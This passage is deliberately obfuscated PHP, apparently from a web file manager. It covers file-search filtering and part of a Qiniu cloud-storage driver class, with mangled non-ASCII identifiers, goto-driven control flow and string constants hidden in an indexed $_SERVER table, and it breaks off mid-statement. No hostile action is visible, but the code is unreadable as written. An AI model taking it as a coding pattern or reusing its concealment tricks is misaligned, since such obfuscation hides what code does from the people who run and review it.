$aıÎÈè‡º· = Model($FÚÕÕÙ¿ÓÂ[420])->field($FÚÕÕÙ¿ÓÂ[76])->where($D•´ ‹Œ∫∆)->select(); goto CèÒ‰ï¢Çñ; D…óŸ∑‰–à: $eÒÆ„î‚∞Ê = array(); $Aä ¡ö¥À‡ = $c™Øø∫Í¶›[$FÚÕÕÙ¿ÓÂ[1775]]; foreach ($B§¨á¯óÓÜ as $fÛ»öÏ¥åÆ) { $Bπí“éêßù = $fÛ»öÏ¥åÆ[$FÚÕÕÙ¿ÓÂ[28]]; $fœΩÃ∫Œ† = str_replace($FÚÕÕÙ¿ÓÂ[50], $FÚÕÕÙ¿ÓÂ[33], Pinyin::encode($Bπí“éêßù)); if (stripos($Bπí“éêßù, $Aä ¡ö¥À‡) !== !1 || stripos($fœΩÃ∫Œ†, $Aä ¡ö¥À‡) !== !1) { $eÒÆ„î‚∞Ê[] = $fÛ»öÏ¥åÆ[$FÚÕÕÙ¿ÓÂ[393]]; } } goto EüÂŒ∑Ú‘Ω; CèÒ‰ï¢Çñ: $aıÎÈè‡º· = array_to_keyvalue($aıÎÈè‡º·, $FÚÕÕÙ¿ÓÂ[33], $FÚÕÕÙ¿ÓÂ[76]); $Eª°Ω·ﬁ†⁄ = array_unique($aıÎÈè‡º·); $this->_listSearchMerge($D§‰‚‚ë¬å, $c™Øø∫Í¶›, $aïàÌ«∫ê¥, $Eª°Ω·ﬁ†⁄); goto e‘‚©ˆ°ë§; A  ≈ﬂÌ°ç: $FÚÕÕÙ¿ÓÂ =& $_SERVER[ú∫]; if (!$c™Øø∫Í¶›[$FÚÕÕÙ¿ÓÂ[1775]] || $D§‰‚‚ë¬å[$FÚÕÕÙ¿ÓÂ[364]][$FÚÕÕÙ¿ÓÂ[351]] > 1) { return; } $B§¨á¯óÓÜ = Model($FÚÕÕÙ¿ÓÂ[1936])->listData(); goto D…óŸ∑‰–à; e‘‚©ˆ°ë§: } private function _listSearchDesc(&$dË¬üƒ“ı, $aˆ‹çâ≠—¨, $aµËâﬁªº´) { goto dáê•··Ù™; eõÖ≈â‘ï˘: $aßúêÇÊÈÁ = array_unique($aßúêÇÊÈÁ); if (!$aßúêÇÊÈÁ) { return; } $b±πﬁ≥à”∂ = array($Fç»’ù ‘Ú[395] => array($Fç»’ù ‘Ú[7], $aßúêÇÊÈÁ), $Fç»’ù ‘Ú[93] => $Fç»’ù ‘Ú[431], $Fç»’ù ‘Ú[372] => array($Fç»’ù ‘Ú[380], $Fç»’ù ‘Ú[1777] . $aˆ‹çâ≠—¨[$Fç»’ù ‘Ú[1775]] . $Fç»’ù ‘Ú[1777])); goto Eû˜ªﬁ˜·É; dáê•··Ù™: $Fç»’ù ‘Ú =& $_SERVER[ú∫]; if (!$aˆ‹çâ≠—¨[$Fç»’ù ‘Ú[1775]] || $dË¬üƒ“ı[$Fç»’ù ‘Ú[364]][$Fç»’ù ‘Ú[351]] > 1) { return; } $aßúêÇÊÈÁ = $this->listSearchChildren($aˆ‹çâ≠—¨[$Fç»’ù ‘Ú[478]]); goto eõÖ≈â‘ï˘; Eû˜ªﬁ˜·É: $FÆæ∏Ωã¨ï = Model($Fç»’ù ‘Ú[532])->field($Fç»’ù ‘Ú[395])->where($b±πﬁ≥à”∂)->select(); $bÖñÑù–•÷ = array_to_keyvalue($FÆæ∏Ωã¨ï, $Fç»’ù ‘Ú[33], $Fç»’ù ‘Ú[395]); $this->_listSearchMerge($dË¬üƒ“ı, $aˆ‹çâ≠—¨, $aµËâﬁªº´, $bÖñÑù–•÷); goto fïË∂ûèÚ”; fïË∂ûèÚ”: } private function _listSearchGroupTag(&$b‰ﬂå•ãƒÆ, $aõôΩë˜≈‚, $CôÎëØ„Ë‘) { goto DåÀâæèòÈ; FÇáﬂ©Éö: $c‚µÁùèá˘ = array_to_keyvalue($c‚µÁùèá˘, $c≈˜ªÎâ†ﬂ[33], $c≈˜ªÎâ†ﬂ[76]); $B“í≠ˆÌûû = array_unique($c‚µÁùèá˘); $this->_listSearchMerge($b‰ﬂå•ãƒÆ, $aõôΩë˜≈‚, $CôÎëØ„Ë‘, $B“í≠ˆÌûû); goto BË‘™¨«°Ó; DÇ®ÂÑ√ﬁÎ: if (!$FÇâçÔ¿‡— || $FÇâçÔ¿‡—[$c≈˜ªÎâ†ﬂ[404]] != SourceModel::TYPE_GROUP) { return; } $a€µçÑíπÂ = $FÇâçÔ¿‡—[$c≈˜ªÎâ†ﬂ[484]]; $dõ‘÷ÿ÷Ç» = Model($c≈˜ªÎâ†ﬂ[1937])->get($a€µçÑíπÂ); goto EÃª„ä˘ Ì; a¥ü–£ãª∆: if (!$E™…·„ÛÑù) { return; } $c¥∆ñà€ﬂÔ = array($c≈˜ªÎâ†ﬂ[419] => array($c≈˜ªÎâ†ﬂ[7], $E™…·„ÛÑù), $c≈˜ªÎâ†ﬂ[1528] => 0, $c≈˜ªÎâ†ﬂ[29] => $c≈˜ªÎâ†ﬂ[1799] . $a€µçÑíπÂ); $c‚µÁùèá˘ = Model($c≈˜ªÎâ†ﬂ[420])->field($c≈˜ªÎâ†ﬂ[76])->where($c¥∆ñà€ﬂÔ)->select(); goto FÇáﬂ©Éö; DåÀâæèòÈ: $c≈˜ªÎâ†ﬂ =& $_SERVER[ú∫]; if (!$aõôΩë˜≈‚[$c≈˜ªÎâ†ﬂ[1775]] || $b‰ﬂå•ãƒÆ[$c≈˜ªÎâ†ﬂ[364]][$c≈˜ªÎâ†ﬂ[351]] > 1 || !$aõôΩë˜≈‚[$c≈˜ªÎâ†ﬂ[478]]) { return; } $FÇâçÔ¿‡— = $this->sourceInfo($aõôΩë˜≈‚[$c≈˜ªÎâ†ﬂ[478]]); goto DÇ®ÂÑ√ﬁÎ; EÃª„ä˘ Ì: $E™…·„ÛÑù = array(); $eÿπú›ƒ∑§ = $aõôΩë˜≈‚[$c≈˜ªÎâ†ﬂ[1775]]; foreach ($dõ‘÷ÿ÷Ç»[$c≈˜ªÎâ†ﬂ[367]] as $B≥ÚÆπ˘¢®) { $a˘·ˆ’œ‘§ = $B≥ÚÆπ˘¢®[$c≈˜ªÎâ†ﬂ[28]]; $BÖΩÍìÙﬂë = str_replace($c≈˜ªÎâ†ﬂ[50], $c≈˜ªÎâ†ﬂ[33], Pinyin::encode($a˘·ˆ’œ‘§)); if (stripos($a˘·ˆ’œ‘§, $eÿπú›ƒ∑§) !== !1 || stripos($BÖΩÍìÙﬂë, $eÿπú›ƒ∑§) !== !1) { $E™…·„ÛÑù[] = $B≥ÚÆπ˘¢®[$c≈˜ªÎâ†ﬂ[393]]; } } goto a¥ü–£ãª∆; BË‘™¨«°Ó: } private function _listSearchMerge(&$B”ù≥˜Œœ∆, $cÖÀ·Áé‰á, $eäê´‡âèå, $E“¬≠ˆ“ò›) { goto C™ ˜âˆ„; e†‹À´ãÑõ: $cû‚™ÂõË≤ = $this->field($eäê´‡âèå)->where($Aé˘ß¬ñÉû)->select(); if (!$cû‚™ÂõË≤) { return; } $c…ªñœ√∑ = array(); goto B∫Î≠®îì; B∫Î≠®îì: foreach ($cû‚™ÂõË≤ as $c€”Éëì∫”) { if ($this->_listSearchFilter($c€”Éëì∫”, $cÖÀ·Áé‰á)) { $c…ªñœ√∑[] = $c€”Éëì∫”; } } $B”ù≥˜Œœ∆[$cÑãç›”„Ï[367]] = array_merge($c…ªñœ√∑, $B”ù≥˜Œœ∆[$cÑãç›”„Ï[367]]); $B”ù≥˜Œœ∆[$cÑãç›”„Ï[364]][$cÑãç›”„Ï[365]] += count($c…ªñœ√∑); goto a—ãäçËîö; A¡œ—Éî”›: $Bçû…È¬ﬂà = array_diff($E“¬≠ˆ“ò›, $e´ÁƒÁÀºÍ); if (!$Bçû…È¬ﬂà) { return; } $Aé˘ß¬ñÉû = array($cÑãç›”„Ï[395] => array($cÑãç›”„Ï[7], $Bçû…È¬ﬂà)); goto e†‹À´ãÑõ; C™ ˜âˆ„: $cÑãç›”„Ï =& $_SERVER[ú∫]; if (!$E“¬≠ˆ“ò›) { return; } $e´ÁƒÁÀºÍ = array_to_keyvalue($B”ù≥˜Œœ∆[$cÑãç›”„Ï[367]], $cÑãç›”„Ï[33], $cÑãç›”„Ï[395]); goto A¡œ—Éî”›; a—ãäçËîö: } private function _listSearchFilter($e∆®¯Ó·Ø, $c§Î¶≥‘î) { goto fÿ‹ÎÎ∑÷€; fÿ‹ÎÎ∑÷€: $F«ñ∏ËπÔÏ =& $_SERVER[ú∫]; $d±≥–√©∂˜ = $e∆®¯Ó·Ø[$F«ñ∏ËπÔÏ[403]] == $F«ñ∏ËπÔÏ[87]; if (!strstr($e∆®¯Ó·Ø[$F«ñ∏ËπÔÏ[487]], $F«ñ∏ËπÔÏ[47] . $c§Î¶≥‘î[$F«ñ∏ËπÔÏ[478]] . $F«ñ∏ËπÔÏ[47])) { return !1; } goto bÍó≈⁄∂Õë; bÍó≈⁄∂Õë: if (isset($c§Î¶≥‘î[$F«ñ∏ËπÔÏ[405]]) && $c§Î¶≥‘î[$F«ñ∏ËπÔÏ[405]] != $F«ñ∏ËπÔÏ[1742]) { if ($c§Î¶≥‘î[$F«ñ∏ËπÔÏ[405]] == $F«ñ∏ËπÔÏ[77] && !$d±≥–√©∂˜) { return !1; } if ($c§Î¶≥‘î[$F«ñ∏ËπÔÏ[405]] != $F«ñ∏ËπÔÏ[77] && $d±≥–√©∂˜) { return !1; } if (!strstr($e∆®¯Ó·Ø[$F«ñ∏ËπÔÏ[168]], $F«ñ∏ËπÔÏ[47] . $c§Î¶≥‘î[$F«ñ∏ËπÔÏ[405]] . $F«ñ∏ËπÔÏ[47])) { return !1; } } if (isset($c§Î¶≥‘î[$F«ñ∏ËπÔÏ[1938]]) && $c§Î¶≥‘î[$F«ñ∏ËπÔÏ[1938]] < $e∆®¯Ó·Ø[$F«ñ∏ËπÔÏ[78]]) { return !1; } if (isset($c§Î¶≥‘î[$F«ñ∏ËπÔÏ[1939]]) && $c§Î¶≥‘î[$F«ñ∏ËπÔÏ[1939]] > $e∆®¯Ó·Ø[$F«ñ∏ËπÔÏ[78]]) { return !1; } goto A≈î≠ë¬Á∆; A≈î≠ë¬Á∆: if (isset($c§Î¶≥‘î[$F«ñ∏ËπÔÏ[562]]) && $c§Î¶≥‘î[$F«ñ∏ËπÔÏ[562]] != $e∆®¯Ó·Ø[$F«ñ∏ËπÔÏ[434]]) { return !1; } return !0; goto bΩö¬¿ËÔÊ; bΩö¬¿ËÔÊ: } public function listSearchChildren($cùú¥πÿÖÓ, $C £ºà¯ºñ = 5000) { goto fîõÙ” –ú; fîõÙ” –ú: $fè£ øÜ¿ß =& $_SERVER[ú∫]; $EÜÌÛüÓî = array(); $f¥≠≈‡¬äâ = $this->sourceInfo($cùú¥πÿÖÓ); goto cÙÙé∏ßçˆ; cÙÙé∏ßçˆ: $AŒ∫Ü”∂◊› = array($fè£ øÜ¿ß[487] => array($fè£ øÜ¿ß[380], $f¥≠≈‡¬äâ[$fè£ øÜ¿ß[487]] . $f¥≠≈‡¬äâ[$fè£ øÜ¿ß[395]] . $fè£ øÜ¿ß[513])); $aÁéïÿ‰Ùû = $this->field($fè£ øÜ¿ß[395])->cache(null, 600)->where($AŒ∫Ü”∂◊›)->count(); if ($aÁéïÿ‰Ùû > $C £ºà¯ºñ) { return $this->_listSearchChildrenNear($cùú¥πÿÖÓ, $C £ºà¯ºñ); } goto d÷π£§‚îª; d÷π£§‚îª: $EéﬁŒ⁄àº = $this->field($fè£ øÜ¿ß[395])->where($AŒ∫Ü”∂◊›)->select(); $EÜÌÛüÓî = array_to_keyvalue($EéﬁŒ⁄àº, $fè£ øÜ¿ß[33], $fè£ øÜ¿ß[395]); return $EÜÌÛüÓî; goto DÒñáÈõƒê; DÒñáÈõƒê: } private function _listSearchChildrenNear($E¿ï´ê⁄éí, $C¢£ÕÍΩô™) { goto D¡÷Ë›‡çÍ; DÃú⁄à¯íå: $c◊£ó¨çˆ¶ = array_merge($c◊£ó¨çˆ¶, array_to_keyvalue($EñŒ∆êìÈœ, $c¡Ãæﬂ¶åØ[33], $c¡Ãæﬂ¶åØ[395])); $c◊£ó¨çˆ¶ = array_slice($c◊£ó¨çˆ¶, 0, $C¢£ÕÍΩô™); return $c◊£ó¨çˆ¶; goto CãÖœå’œå; c„éñ…·ﬁ‘: if (!$bò¨èãÍ»∆) { return $c◊£ó¨çˆ¶; } $fËÉÂØ™Ç£ = array($c¡Ãæﬂ¶åØ[478] => array($c¡Ãæﬂ¶åØ[7], $bò¨èãÍ»∆)); $EñŒ∆êìÈœ = $this->field($c¡Ãæﬂ¶åØ[1940])->where($fËÉÂØ™Ç£)->limit($C¢£ÕÍΩô™)->select(); goto DÃú⁄à¯íå; D¡÷Ë›‡çÍ: $c¡Ãæﬂ¶åØ =& $_SERVER[ú∫]; $c◊£ó¨çˆ¶ = array(); $fËÉÂØ™Ç£ = array($c¡Ãæﬂ¶åØ[478] => $E¿ï´ê⁄éí); goto fÍ÷ÈËàÂ÷; fÍ÷ÈËàÂ÷: $EñŒ∆êìÈœ = $this->field($c¡Ãæﬂ¶åØ[1940])->where($fËÉÂØ™Ç£)->select(); $bò¨èãÍ»∆ = array_to_keyvalue(array_filter_by_field($EñŒ∆êìÈœ, $c¡Ãæﬂ¶åØ[403], $c¡Ãæﬂ¶åØ[87]), $c¡Ãæﬂ¶åØ[33], $c¡Ãæﬂ¶åØ[395]); $c◊£ó¨çˆ¶ = array_merge($c◊£ó¨çˆ¶, array_to_keyvalue($EñŒ∆êìÈœ, $c¡Ãæﬂ¶åØ[33], $c¡Ãæﬂ¶åØ[395])); goto c„éñ…·ﬁ‘; CãÖœå’œå: } private function _listSearchBindPinyin($bá–⁄’ÂÌï, &$D∆Âæ∂ ßÕ, &$cø¡˜Æ«àé) { goto DÖƒé±ÿ’è; BîìÆàé‡¯: $D∆Âæ∂ ßÕ = $B˜´ﬁ⁄∑®Ó; goto Bπá™¶Ñ“™; DÖƒé±ÿ’è: $E’î¡õΩ˘ß =& $_SERVER[ú∫]; if (!isset($bá–⁄’ÂÌï[$E’î¡õΩ˘ß[1775]]) || !$bá–⁄’ÂÌï[$E’î¡õΩ˘ß[1775]]) { return; } if (!Input::check($bá–⁄’ÂÌï[$E’î¡õΩ˘ß[1775]], $E’î¡õΩ˘ß[316]) || strlen($bá–⁄’ÂÌï[$E’î¡õΩ˘ß[1775]]) < 2) { return; } goto d°¥Üû·Øè; e‚†ÍÃ±√î: $cø¡˜Æ«àé = $E’î¡õΩ˘ß[1942] . str_replace($E’î¡õΩ˘ß[47], $E’î¡õΩ˘ß[1943], $cø¡˜Æ«àé); $D‚ºáòƒÁÆ = $D∆Âæ∂ ßÕ[$E’î¡õΩ˘ß[28]]; unset($D∆Âæ∂ ßÕ[$E’î¡õΩ˘ß[28]]); goto DŸáÉõú‘‚; d°¥Üû·Øè: $f∑ÓΩ…å∫ã = "\x4c\105\106\x54\40\112\117\x49\x4e\x20{$this->tablePrefix}\151\157\137\x73\157\165\x72\143\x65\137\155\145\x74\x61\x20\x6d\x65\x74\x61\40\x6f\x6e\40\x73\157\165\x72\x63\145\56\x73\157\x75\162\143\145\111\x44\40\75\40\x6d\145\x74\x61\x2e\x73\157\x75\162\x63\145\111\x44"; $B˜´ﬁ⁄∑®Ó = array(); $cø¡˜Æ«àé = str_replace(array($E’î¡õΩ˘ß[229], $E’î¡õΩ˘ß[50], $E’î¡õΩ˘ß[1941]), $E’î¡õΩ˘ß[33], $cø¡˜Æ«àé); goto e‚†ÍÃ±√î; DŸáÉõú‘‚: foreach ($D∆Âæ∂ ßÕ as $dù–Òñã„⁄ => $c€Öà®ñ‘ò) { $B˜´ﬁ⁄∑®Ó[$E’î¡õΩ˘ß[1942] . $dù–Òñã„⁄] = $c€Öà®ñ‘ò; } foreach ($D‚ºáòƒÁÆ as $D¯§öÑÙª€) { $B˜´ﬁ⁄∑®Ó[] = array($E’î¡õΩ˘ß[1944] => $D¯§öÑÙª€, $E’î¡õΩ˘ß[957] => $E’î¡õΩ˘ß[1779], array($E’î¡õΩ˘ß[1945] => $D¯§öÑÙª€, $E’î¡õΩ˘ß[1946] => array($E’î¡õΩ˘ß[7], array($E’î¡õΩ˘ß[444], $E’î¡õΩ˘ß[443])))); } $this->join($f∑ÓΩ…å∫ã); goto BîìÆàé‡¯; Bπá™¶Ñ“™: } private function _parseSearchWhere($bø•©§∂îï) { goto eåÍÏÖñæ; Aãò®ú∂îﬂ: if (isset($bø•©§∂îï[$EπÖÏ¶çÀ≥[476]]) && $bø•©§∂îï[$EπÖÏ¶çÀ≥[476]]) { $F©çäöÎ« = array($EπÖÏ¶çÀ≥[1948], $bø•©§∂îï[$EπÖÏ¶çÀ≥[476]]); if ($a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[84]]) { $a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[84]] = array($a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[84]], $F©çäöÎ«, $EπÖÏ¶çÀ≥[1949]); } else { $a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[84]] = $F©çäöÎ«; } } if (isset($bø•©§∂îï[$EπÖÏ¶çÀ≥[1938]]) && $bø•©§∂îï[$EπÖÏ¶çÀ≥[1938]] > 0) { $a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[78]] = array($EπÖÏ¶çÀ≥[1947], $bø•©§∂îï[$EπÖÏ¶çÀ≥[1938]]); } if (isset($bø•©§∂îï[$EπÖÏ¶çÀ≥[1939]]) && $bø•©§∂îï[$EπÖÏ¶çÀ≥[1939]]) { $F©çäöÎ« = array($EπÖÏ¶çÀ≥[1948], $bø•©§∂îï[$EπÖÏ¶çÀ≥[1939]]); if ($a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[78]]) { $a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[78]] = array($a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[78]], $F©çäöÎ«, $EπÖÏ¶çÀ≥[1949]); } else { $a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[78]] = $F©çäöÎ«; } } goto cﬁœåÉŸØô; cﬁœåÉŸØô: if (isset($bø•©§∂îï[$EπÖÏ¶çÀ≥[562]]) && $bø•©§∂îï[$EπÖÏ¶çÀ≥[562]]) { $a≥ã‡≥éÿß[] = array($EπÖÏ¶çÀ≥[434] => $bø•©§∂îï[$EπÖÏ¶çÀ≥[562]], $EπÖÏ¶çÀ≥[432] => $bø•©§∂îï[$EπÖÏ¶çÀ≥[562]], $EπÖÏ¶çÀ≥[957] => $EπÖÏ¶çÀ≥[1779]); } if (isset($bø•©§∂îï[$EπÖÏ¶çÀ≥[405]]) && $bø•©§∂îï[$EπÖÏ¶çÀ≥[405]]) { $fÑù‡áÜ”ä = $bø•©§∂îï[$EπÖÏ¶çÀ≥[405]]; if ($fÑù‡áÜ”ä == $EπÖÏ¶çÀ≥[77]) { $a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[403]] = 1; } else { if ($fÑù‡áÜ”ä == $EπÖÏ¶çÀ≥[1950]) { $a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[403]] = 0; } else { if ($fÑù‡áÜ”ä) { $fÑù‡áÜ”ä = is_array($fÑù‡áÜ”ä) ? $fÑù‡áÜ”ä : explode($EπÖÏ¶çÀ≥[47], $fÑù‡áÜ”ä); $a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[405]] = array($EπÖÏ¶çÀ≥[411], $fÑù‡áÜ”ä); $a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[403]] = 0; } } } } if (isset($bø•©§∂îï[$EπÖÏ¶çÀ≥[478]]) && $bø•©§∂îï[$EπÖÏ¶çÀ≥[478]]) { $C·ﬂú†åÁÃ = $this->sourceInfo($bø•©§∂îï[$EπÖÏ¶çÀ≥[478]]); $a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[553]] = array($EπÖÏ¶çÀ≥[512], $C·ﬂú†åÁÃ[$EπÖÏ¶çÀ≥[487]] . $bø•©§∂îï[$EπÖÏ¶çÀ≥[478]] . $EπÖÏ¶çÀ≥[513]); } goto Bª°ëÇÍä‡; eåÍÏÖñæ: $EπÖÏ¶çÀ≥ =& $_SERVER[ú∫]; $a≥ã‡≥éÿß = array(); if (isset($bø•©§∂îï[$EπÖÏ¶çÀ≥[721]]) && $bø•©§∂îï[$EπÖÏ¶çÀ≥[721]]) { $a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[84]] = array($EπÖÏ¶çÀ≥[1947], $bø•©§∂îï[$EπÖÏ¶çÀ≥[721]]); } goto Aãò®ú∂îﬂ; Bª°ëÇÍä‡: if (isset($bø•©§∂îï[$EπÖÏ¶çÀ≥[1775]]) && trim($bø•©§∂îï[$EπÖÏ¶çÀ≥[1775]])) { $d¯‘ìËæÜá = trim($bø•©§∂îï[$EπÖÏ¶çÀ≥[1775]]); $A¯£Ï≈áÚ° = explode($EπÖÏ¶çÀ≥[50], $d¯‘ìËæÜá); if (strlen($d¯‘ìËæÜá) > 2 && (substr($d¯‘ìËæÜá, 0, 1) == $EπÖÏ¶çÀ≥[116] && substr($d¯‘ìËæÜá, -1) == $EπÖÏ¶çÀ≥[116]) || substr($d¯‘ìËæÜá, 0, 1) == $EπÖÏ¶çÀ≥[55] && substr($d¯‘ìËæÜá, -1) == $EπÖÏ¶çÀ≥[55]) { $d¯‘ìËæÜá = substr($d¯‘ìËæÜá, 1, -1); $A¯£Ï≈áÚ° = array($d¯‘ìËæÜá); } $a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[28]] = array(array($EπÖÏ¶çÀ≥[512], $EπÖÏ¶çÀ≥[1777] . $d¯‘ìËæÜá . $EπÖÏ¶çÀ≥[1777])); if (count($A¯£Ï≈áÚ°) > 1) { $a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[28]] = array(); foreach ($A¯£Ï≈áÚ° as $A€∂µ€˜·•) { if (!trim($A€∂µ€˜·•)) { continue; } $a≥ã‡≥éÿß[$EπÖÏ¶çÀ≥[28]][] = array($EπÖÏ¶çÀ≥[512], $EπÖÏ¶çÀ≥[1777] . trim($A€∂µ€˜·•) . $EπÖÏ¶çÀ≥[1777]); } } } return $a≥ã‡≥éÿß; goto a™ﬂ¨¢•ÒÕ; a™ﬂ¨¢•ÒÕ: } } goto B∆ıÂÔçóµ; eÌœç¡ÓùÊ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($c† ùè÷ê ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ú∫][1302]; $this->_init($c† ùè÷ê ); } public function _init($C”∑÷Æ¡óÜ) { goto F¡öË∫˜§É; fèÒü¡§ìœ: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto d±¯ÁóÌ≈à; C§Öã·∆á»: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto fèÒü¡§ìœ; F¡öË∫˜§É: $Aæ›êΩ´Òœ =& $_SERVER[ú∫]; foreach ($C”∑÷Æ¡óÜ as $dõ≤ôÜ¶öÒ => $E⁄ìﬂ≤ÿ⁄æ) { if (isset($this->{$dõ≤ôÜ¶öÒ})) { $this->{$dõ≤ôÜ¶öÒ} = $E⁄ìﬂ≤ÿ⁄æ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Aæ›êΩ´Òœ[1303] . LNG($Aæ›êΩ´Òœ[1262])); } goto C§Öã·∆á»; d±¯ÁóÌ≈à: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($EÇ¢±ö’Ñ¥, $CòïØ…Ÿ∏Ë = '', $E©¯π¡ïñµ = REPEAT_RENAME) { if ($this->setContent($EÇ¢±ö’Ñ¥, $CòïØ…Ÿ∏Ë)) { return $this->getPathOuter($EÇ¢±ö’Ñ¥); } return !1; } public function mkdir($cè£€ı«—Á, $eòüÏÿ”ä˘ = REPEAT_SKIP) { goto bú≥È±ˆô˜; bú≥È±ˆô˜: $B˘æì√Ÿ…Ã =& $_SERVER[ú∫]; $a—£è˘»ˆ™ = trim($cè£€ı«—Á, $B˘æì√Ÿ…Ã[8]); if ($this->_isFolder($a—£è˘»ˆ™)) { return $this->getPathOuter($a—£è˘»ˆ™); } goto Cõ√Ïß£√È; Cõ√Ïß£√È: $cè£€ı«—Á = $a—£è˘»ˆ™ . $B˘æì√Ÿ…Ã[8]; $F‡›¨â¿å÷ = get_path_this($a—£è˘»ˆ™); $BÑç ˜—îô = $cè£€ı«—Á . $F‡›¨â¿å÷; goto B¡“ÒÀ’ã¢; B¡“ÒÀ’ã¢: if (!$this->mkfile($BÑç ˜—îô)) { return !1; } if (!$this->moveFile($BÑç ˜—îô, $cè£€ı«—Á)) { $this->delFile($BÑç ˜—îô); return !1; } return $this->getPathOuter($a—£è˘»ˆ™); goto AÆÉØªè„á; AÆÉØªè„á: } public function copyFile($FöÖûóÒôà, $c’ ÙçìâÏ) { $D≠èﬂıà¿ç = $this->bucketManager->copy($this->bucket, $FöÖûóÒôà, $this->bucket, $c’ ÙçìâÏ, !0); return $D≠èﬂıà¿ç ? !1 : $this->getPathOuter($c’ ÙçìâÏ); } public function moveFile($cä≤â€…∑Á, $e¬ƒÓé≥´‘) { $DŸãî‹≈™© = $this->bucketManager->move($this->bucket, $cä≤â€…∑Á, $this->bucket, $e¬ƒÓé≥´‘, !0); return $DŸãî‹≈™© ? !1 : $this->getPathOuter($e¬ƒÓé≥´‘); } public function delFile($D°¥ôÛÖüÀ) { if (!$this->exist($D°¥ôÛÖüÀ)) { return !0; } $C≈Ã¢¯∏îé = $this->bucketManager->delete($this->bucket, $D°¥ôÛÖüÀ); return $C≈Ã¢¯∏îé ? !1 : !0; } public function delFolder($eÖ‰«Áóª») { goto bÈäƒÎ¨í¥; dÉ®ˆÕËú∏: if (!empty($eÖ‰«Áóª») && $eÖ‰«Áóª» !== $D§í’è≈âë[191] && !in_array($b˘©∆›øÑú, $CÌÙŒ€™Ø≈[$D§í’è≈âë[75]])) { $CÌÙŒ€™Ø≈[$D§í’è≈âë[75]][] = $b˘©∆›øÑú; } $EŒÕö∫Èù´ = $this->delByBatch($CÌÙŒ€™Ø≈[$D§í’è≈âë[74]]); if (!$EŒÕö∫Èù´) { return !1; } goto aÍŸë‡Èƒã; aÍŸë‡Èƒã: $EŒÕö∫Èù´ = $this->delByBatch($CÌÙŒ€™Ø≈[$D§í’è≈âë[75]]); if (!$EŒÕö∫Èù´) { return !1; } return $this->delFile($b˘©∆›øÑú); goto Dﬂ…–áÑ«Ò; bÈäƒÎ¨í¥: $D§í’è≈âë =& $_SERVER[ú∫]; if (!$this->exist($eÖ‰«Áóª»)) { return !0; } $this->listItemCache = !1; goto CÌÓ˜≥õ¶Ò; CÌÓ˜≥õ¶Ò: $CÌÙŒ€™Ø≈ = $this->fileList($eÖ‰«Áóª»); $this->listItemCache = !0; $b˘©∆›øÑú = trim($eÖ‰«Áóª», $D§í’è≈âë[8]) . $D§í’è≈âë[8]; goto dÉ®ˆÕËú∏; Dﬂ…–áÑ«Ò: } private function delByBatch($bª‡Ëˆ∂Ÿã) { foreach (array_chunk($bª‡Ëˆ∂Ÿã, 1000) as $Dœóüæà˘÷) { $c≥äºó◊∆Ê = $this->bucketManager->buildBatchDelete($this->bucket, $Dœóüæà˘÷); list($dú¬∞≠áû÷, $F±ÌÎÎáÀñ) = $this->bucketManager->batch($c≥äºó◊∆Ê); if ($F±ÌÎÎáÀñ) { return !1; } } return !0; } public function rename($E¨–úÊ‹ßË, $F”éŒ√ÌπÆ) { return $this->renameObject($E¨–úÊ‹ßË, $F”éŒ√ÌπÆ); } public function fileInfo($B≥©µ∫ÉÕ‹, $fæ≤∏Ëä§§ = false, $AÌ£ä—¶¢… = array()) { goto E–ÎﬁÀÍ≈¨; E–ÎﬁÀÍ≈¨: $A‚Ôöê¬–Ç =& $_SERVER[ú∫]; $A√∏§¢ª∫Ÿ = array($A‚Ôöê¬–Ç[28] => $this->pathThis($B≥©µ∫ÉÕ‹), $A‚Ôöê¬–Ç[76] => $this->getPathOuter($A‚Ôöê¬–Ç[8] . $B≥©µ∫ÉÕ‹), $A‚Ôöê¬–Ç[29] => $A‚Ôöê¬–Ç[193], $A‚Ôöê¬–Ç[78] => isset($AÌ£ä—¶¢…[$A‚Ôöê¬–Ç[1304]]) ? $AÌ£ä—¶¢…[$A‚Ôöê¬–Ç[1304]] : 0, $A‚Ôöê¬–Ç[168] => $this->ext($B≥©µ∫ÉÕ‹)); if ($fæ≤∏Ëä§§) { return $A√∏§¢ª∫Ÿ; } goto B—£·ÜøÔÒ; FÃÖÍñºÈ¬: if (isset($AÌ£ä—¶¢…[$A‚Ôöê¬–Ç[1305]])) { $A√∏§¢ª∫Ÿ[$A‚Ôöê¬–Ç[84]] = substr($AÌ£ä—¶¢…[$A‚Ôöê¬–Ç[1305]] . $A‚Ôöê¬–Ç[33], 0, 10); } if (isset($AÌ£ä—¶¢…[$A‚Ôöê¬–Ç[1304]])) { $A√∏§¢ª∫Ÿ[$A‚Ôöê¬–Ç[78]] = $AÌ£ä—¶¢…[$A‚Ôöê¬–Ç[1304]]; } return $A√∏§¢ª∫Ÿ; goto cÖÛªàú∆ÿ; B—£·ÜøÔÒ: $A√∏§¢ª∫Ÿ[$A‚Ôöê¬–Ç[194]] = 